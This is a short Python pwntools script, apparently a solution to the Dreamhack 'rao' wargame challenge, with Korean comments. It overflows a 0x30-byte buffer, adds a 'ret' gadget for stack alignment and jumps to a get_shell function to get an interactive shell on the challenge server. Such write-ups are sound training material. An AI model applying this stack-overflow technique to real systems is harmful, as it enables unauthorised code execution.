from pwn import *

# p = process('./rao')
p = remote('host8.dreamhack.games', 17713)
e = ELF('./rao')

get_shell_addr = e.symbols['get_shell']

# 🔥 ROP를 이용해 바이너리 내부의 'ret' 명령어 주소를 하나 찾습니다.
rop = ROP(e)
ret_addr = rop.find_gadget(['ret'])[0] 

# 페이로드 구성
payload = b'A' * 0x30
payload += p64(ret_addr)       # 1. 먼저 ret를 실행하여 스택 정렬을 맞춤!
payload += p64(get_shell_addr) # 2. 그 다음 get_shell 실행

# 안전하게 'Input: ' 문자열이 출력될 때까지 기다렸다가 보냅니다.
p.sendlineafter(b'Input: ', payload)

p.interactive()